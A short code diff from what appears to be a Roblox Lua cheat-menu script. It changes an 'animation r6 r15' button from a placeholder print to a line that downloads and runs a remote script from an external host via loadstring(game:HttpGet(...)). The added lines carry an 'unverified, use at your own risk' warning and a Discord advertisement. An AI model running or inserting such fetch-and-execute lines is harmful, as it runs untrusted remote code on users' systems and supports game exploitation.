@@ -144,5 +144,9 @@ loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-7yd7-I-Emot
 end)
 
 Section:NewButton("animation r6 r15/انميشن", "ButtonInfo", function()
-    print("Clicked")
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+-- this script was brought to you by discord.gg/25ms
+loadstring(game:HttpGet"https://you.whimper.xyz/UFE.lua")()
 end)
